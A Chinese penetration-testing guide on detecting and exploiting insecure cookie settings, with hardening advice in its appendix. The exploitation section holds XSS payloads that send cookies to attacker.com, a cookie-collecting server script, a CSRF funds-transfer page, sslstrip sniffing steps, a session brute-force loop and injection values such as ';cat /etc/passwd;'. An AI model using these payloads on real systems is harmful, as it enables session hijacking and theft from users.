# Cookie 安全配置错误利用方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 Cookie 安全配置错误检测和利用流程。Cookie 是 Web 应用中用于会话管理和状态保持的关键机制，当 Cookie 的安全属性配置不当时，可能导致会话劫持、信息泄露、跨站攻击等严重安全问题。

## 1.2 适用范围

- 所有使用 Cookie 进行会话管理的 Web 应用
- 使用 Cookie 存储敏感信息的系统
- 需要会话保持的认证系统
- API 令牌存储机制

## 1.3 读者对象

- 渗透测试工程师
- 安全分析师
- Web 应用安全审计人员
- 前端/后端开发人员

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

Cookie 安全配置错误是指 Web 应用在设置 Cookie 时未正确配置安全属性，导致 Cookie 可能被窃取、篡改或在不安全的通道中传输。

**本质问题**：
- Cookie 未设置 Secure 标志，可通过 HTTP 明文传输
- Cookie 未设置 HttpOnly 标志，可被 JavaScript 读取
- Cookie 未设置 SameSite 标志，易受 CSRF 攻击
- Cookie 作用域设置过宽，可被子域名访问
- Cookie 存储敏感信息未加密

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-315 | Cleartext Storage of Sensitive Information in a Cookie（Cookie 中以明文存储敏感信息） |
| CWE-614 | Sensitive Cookie in HTTPS Session Without 'Secure' Attribute（HTTPS 会话中缺少'Secure'属性的敏感 Cookie） |
| CWE-1004 | Sensitive Cookie Without 'HttpOnly' Flag（缺少'HttpOnly'标志的敏感 Cookie） |
| CWE-1275 | Sensitive Cookie with Improper SameSite Attribute（SameSite 属性配置不当的敏感 Cookie） |

### Cookie 安全属性说明

| 属性 | 作用 | 缺失风险 |
|-----|------|---------|
| **Secure** | 仅通过 HTTPS 传输 | 中间人攻击、会话劫持 |
| **HttpOnly** | 禁止 JavaScript 访问 | XSS 窃取 Cookie |
| **SameSite** | 限制跨站发送 | CSRF 攻击 |
| **Domain** | 指定 Cookie 作用域 | 子域名攻击 |
| **Path** | 指定 Cookie 路径 | 路径遍历访问 |
| **Expires/Max-Age** | 设置过期时间 | 会话固定攻击 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 风险点描述 | 潜在危害 |
|---------|-----------|---------|
| **登录认证** | Session Cookie 缺少 Secure/HttpOnly | 会话劫持、凭证窃取 |
| **记住我功能** | 长期 Cookie 未加密存储 | 长期未授权访问 |
| **购物车/用户偏好** | Cookie 存储用户数据 | 隐私泄露、数据篡改 |
| **CSRF 令牌** | CSRF Token 存储在 Cookie | CSRF 攻击 |
| **JWT 令牌** | JWT 存储在 Cookie | 令牌窃取、身份冒充 |
| **多域名系统** | Cookie Domain 设置过宽 | 子域名攻击、横向移动 |

## 2.3 漏洞探测方法

### 2.3.1 Cookie 安全属性检测

**1. 手动检查 Cookie**

```bash
# 使用 curl 获取响应头
curl -I https://target.com/login

# 检查 Set-Cookie 头
Set-Cookie: sessionid=abc123; Path=/
# ❌ 缺少 Secure、HttpOnly、SameSite

# 安全的 Cookie 配置
Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
```

**2. 浏览器开发者工具检查**

```
Chrome DevTools → Application → Cookies
检查每个 Cookie 的属性：
- Secure 复选框是否勾选
- HttpOnly 复选框是否勾选
- SameSite 值是否为 Strict 或 Lax
```

**3. Burp Suite 检查**

```
Proxy → HTTP History → 查看响应
查找 Set-Cookie 头
分析每个 Cookie 的安全属性
```

### 2.3.2 自动化检测工具

```bash
# 使用 Nuclei 扫描
nuclei -t http/misconfiguration/cookie-misconfiguration.yaml -u https://target.com

# 使用 OWASP ZAP
# 内置 Cookie 安全检查规则

# 使用 Cookie 扫描脚本
python3 cookie_scanner.py -u https://target.com
```

### 2.3.3 常见 Cookie 配置问题检查清单

```
□ Session Cookie 是否设置 Secure 标志
□ Session Cookie 是否设置 HttpOnly 标志
□ Session Cookie 是否设置 SameSite 标志
□ Cookie 是否存储敏感信息（密码、令牌）
□ Cookie 是否明文存储
□ Cookie Domain 是否设置过宽
□ Cookie Path 是否限制合理
□ Cookie 是否有合理的过期时间
□ 多个 Cookie 是否使用不同名称
□ 注销后 Cookie 是否正确清除
```

## 2.4 漏洞利用方法

### 2.4.1 缺少 Secure 标志利用（中间人攻击）

**攻击场景**：Cookie 未设置 Secure 标志，可通过 HTTP 窃听获取

**利用步骤**：

```bash
# 步骤 1：确认目标使用 HTTP 或可降级
curl -I http://target.com

# 步骤 2：设置网络嗅探（需要同一网络）
# 使用 Wireshark 或 tcpdump 监听 HTTP 流量
tcpdump -i eth0 -n 'tcp port 80'

# 步骤 3：等待用户访问 HTTP 版本
# 或使用 sslstrip 进行 HTTPS 降级攻击
sslstrip -l 8080 -w capture.log

# 步骤 4：从捕获的流量中提取 Cookie
grep "Set-Cookie" capture.log
# 获取：sessionid=abc123

# 步骤 5：使用窃取的 Cookie 访问
curl -H "Cookie: sessionid=abc123" https://target.com/account
```

**协议降级攻击流程**：

```
用户访问：https://target.com
    ↓
攻击者拦截（sslstrip）
    ↓
降级为：http://target.com
    ↓
Cookie 明文传输
    ↓
攻击者窃取 Cookie
    ↓
冒充用户访问
```

### 2.4.2 缺少 HttpOnly 标志利用（XSS 窃取 Cookie）

**攻击场景**：Cookie 未设置 HttpOnly 标志，可被 JavaScript 读取

**利用步骤**：

```html
<!-- 步骤 1：发现 XSS 漏洞点 -->
<!-- 例如：搜索功能未正确过滤 -->
<input type="text" value="<script>alert(1)</script>">

<!-- 步骤 2：构造 Cookie 窃取 Payload -->
<script>
    // 读取所有 Cookie
    var cookies = document.cookie;
    
    // 发送到攻击者服务器
    fetch('http://attacker.com/steal?c=' + encodeURIComponent(cookies));
    
    // 或使用图片信标
    // new Image().src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>

<!-- 步骤 3：诱导用户点击或存储 XSS -->
<!-- 完整 Payload -->
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

**自动化窃取脚本（攻击者服务器）**：

```python
# attacker_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/steal':
            params = parse_qs(parsed.query)
            cookies = params.get('c', [''])[0]
            print(f"[+] 窃取到 Cookie: {cookies}")
            
            # 保存到文件
            with open('stolen_cookies.txt', 'a') as f:
                f.write(f"{cookies}\n")
        
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 80), StealHandler).serve_forever()
```

### 2.4.3 缺少 SameSite 标志利用（CSRF 攻击）

**攻击场景**：Cookie 未设置 SameSite 标志，可被用于跨站请求

**利用步骤**：

```html
<!-- 攻击者网站：http://attacker.com/csrf.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Click to Win Prize!</title>
</head>
<body>
    <h1>Click here to claim your prize!</h1>
    
    <!-- 方法 1：表单自动提交 -->
    <form id="csrf-form" action="https://target.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="1000">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
    
    <!-- 方法 2：图片标签触发 GET 请求 -->
    <img src="https://target.com/transfer?to=attacker&amount=1000" style="display:none">
    
    <!-- 方法 3：AJAX 请求（需要 CORS 配合） -->
    <script>
        fetch('https://target.com/api/transfer', {
            method: 'POST',
            credentials: 'include',  // 自动携带 Cookie
            body: JSON.stringify({to: 'attacker', amount: 1000})
        });
    </script>
</body>
</html>
```

### 2.4.4 Cookie 明文存储敏感信息利用

**攻击场景**：Cookie 中存储未加密的敏感信息

**检测方法**：

```bash
# 查看 Cookie 内容
curl -I https://target.com

# 示例响应
Set-Cookie: user_id=12345; username=admin; role=administrator

# 分析 Cookie 内容
# user_id=12345 - 用户 ID 明文
# username=admin - 用户名明文
# role=administrator - 角色权限明文
```

**利用方法**：

```bash
# 1. Cookie 篡改 - 提升权限
# 修改 role 参数
curl -H "Cookie: user_id=1; username=admin; role=superadmin" https://target.com/admin

# 2. Cookie 重放 - 身份冒充
# 使用窃取的 Cookie
curl -H "Cookie: sessionid=stolen_session" https://target.com/account

# 3. Cookie 预测 - 会话预测
# 如果 session ID 可预测
for i in {1..1000}; do
    curl -H "Cookie: sessionid=$i" https://target.com/account
done
```

### 2.4.5 Domain 作用域过宽利用

**攻击场景**：Cookie Domain 设置为父域名，可被所有子域名访问

**利用步骤**：

```
目标：Cookie Domain=.target.com

攻击流程：
1. 攻击者控制子域名：evil.target.com
2. 从 evil.target.com 读取 Cookie
3. 使用 Cookie 访问主域名或其他子域名

示例：
# 在 evil.target.com 上
<script>
    // 可读取.target.com 的 Cookie
    var session = document.cookie;
    // 发送到攻击者服务器
    fetch('http://attacker.com/steal?c=' + session);
</script>

# 诱导用户访问
https://evil.target.com/?redirect=https://target.com
```

## 2.5 漏洞利用绕过方法

### 2.5.1 Secure 标志绕过

| 绕过技术 | 描述 | 成功率 |
|---------|------|-------|
| **SSL 剥离** | HTTPS 降级为 HTTP | 高（无 HSTS） |
| **SSL 剥离 2.0** | 利用 HSTS 前窗口 | 中 |
| **同源策略绕过** | 利用其他协议（ws://） | 低 |
| **代理服务器** | 通过代理获取流量 | 中 |

### 2.5.2 HttpOnly 标志绕过

| 绕过技术 | 描述 | 条件 |
|---------|------|------|
| **XSS 直接读取** | document.cookie | 无 HttpOnly |
| **HTTP 头注入** | 响应头注入 Set-Cookie | 存在 CRLF 注入 |
| **Flash XSS** | 旧版 Flash 可读取 | 有 Flash 功能 |
| **Silverlight** | Silverlight 可读取 | 有 Silverlight |

### 2.5.3 SameSite 标志绕过

| 绕过技术 | 描述 | 条件 |
|---------|------|------|
| **GET 转 POST** | 利用表单自动提交 | 仅 SameSite=Lax |
| **307 重定向** | 利用临时重定向 | 浏览器实现差异 |
| **用户交互** | 诱导用户点击 | 所有情况 |
| **跨域嵌套** | iframe 嵌套表单 | 部分浏览器 |

### 2.5.4 Cookie 注入攻击

```bash
# 如果应用未正确验证 Cookie
# 尝试注入恶意值

# 1. SQL 注入
Cookie: sessionid=' OR '1'='1

# 2. 命令注入
Cookie: sessionid=;cat /etc/passwd;

# 3. 模板注入
Cookie: sessionid={{7*7}}

# 4. 序列化对象注入
Cookie: sessionid=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
```

---

# 第三部分：附录

## 3.1 Cookie 安全配置检查清单

```
□ 所有 Cookie 是否设置 Secure 标志（HTTPS 环境）
□ 所有 Cookie 是否设置 HttpOnly 标志
□ 所有 Cookie 是否设置 SameSite=Strict 或 Lax
□ Cookie 是否避免存储敏感信息
□ Cookie 名称是否不包含敏感信息
□ Cookie 值是否加密或签名
□ Cookie 是否有合理的过期时间
□ Cookie Domain 是否限制到最小范围
□ Cookie Path 是否限制到最小范围
□ 注销后 Cookie 是否正确清除
□ 是否实施 Cookie 前缀（__Secure-、__Host-）
```

## 3.2 安全 Cookie 配置示例

**Nginx 配置**：

```nginx
# 设置安全 Cookie
location /login {
    proxy_pass http://backend;
    
    # 添加安全头
    proxy_cookie_path / "/; Secure; HttpOnly; SameSite=Strict";
}
```

**Apache 配置**：

```apache
# 设置安全 Cookie
Header edit Set-Cookie ^(.*)$ "$1; Secure; HttpOnly; SameSite=Strict"
```

**Node.js (Express) 配置**：

```javascript
// 安全的 Cookie 配置
app.use(session({
    cookie: {
        secure: true,        // 仅 HTTPS
        httpOnly: true,      // 禁止 JS 访问
        sameSite: 'strict',  // 防止 CSRF
        maxAge: 3600000,     // 1 小时过期
        domain: 'www.target.com',  // 限制域名
        path: '/'            // 限制路径
    },
    secret: 'your-secret-key'
}));
```

**PHP 配置**：

```php
// php.ini 配置
session.cookie_secure = 1
session.cookie_httponly = 1
session.cookie_samesite = "Strict"
session.use_strict_mode = 1
session.cookie_lifetime = 3600

// 代码中设置
setcookie('session', $value, [
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict',
    'path' => '/',
    'domain' => 'www.target.com',
    'expires' => time() + 3600
]);
```

**Django 配置**：

```python
# settings.py
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'
SESSION_COOKIE_AGE = 3600
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
```

## 3.3 Cookie 前缀安全

| 前缀 | 要求 | 浏览器支持 |
|-----|------|-----------|
| `__Secure-` | 必须设置 Secure 标志 | 现代浏览器 |
| `__Host-` | Secure + HttpOnly + Path=/ + 无 Domain | 现代浏览器 |

**示例**：

```
# 使用 Cookie 前缀
Set-Cookie: __Host-sessionid=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

## 3.4 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Burp Suite** | Cookie 分析 | Proxy → HTTP History |
| **OWASP ZAP** | 自动扫描 | 内置 Cookie 检查 |
| **Nuclei** | 模板扫描 | `nuclei -t cookie-misconfig` |
| **Cookie Editor** | 浏览器插件 | 手动编辑 Cookie |
| **EditThisCookie** | 浏览器插件 | Chrome/Firefox 扩展 |

## 3.5 修复建议

1. **设置 Secure 标志** - 所有 Cookie 仅通过 HTTPS 传输
2. **设置 HttpOnly 标志** - 防止 XSS 窃取 Cookie
3. **设置 SameSite 标志** - 防止 CSRF 攻击
4. **避免存储敏感信息** - Cookie 中不存储密码、令牌等
5. **使用 Cookie 前缀** - 使用 `__Secure-` 或 `__Host-` 前缀
6. **限制作用域** - 设置合理的 Domain 和 Path
7. **设置过期时间** - 避免永久 Cookie
8. **实施 Cookie 轮换** - 定期更换 Session ID
9. **注销清除** - 用户注销时清除所有 Cookie
10. **使用签名/加密** - 对 Cookie 值进行签名或加密

---

**参考资源**：
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers-project/)
- [MDN Cookie Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [RFC 6265 - HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)
- [CWE-315](https://cwe.mitre.org/data/definitions/315.html)
- [CWE-614](https://cwe.mitre.org/data/definitions/614.html)
- [CWE-1004](https://cwe.mitre.org/data/definitions/1004.html)
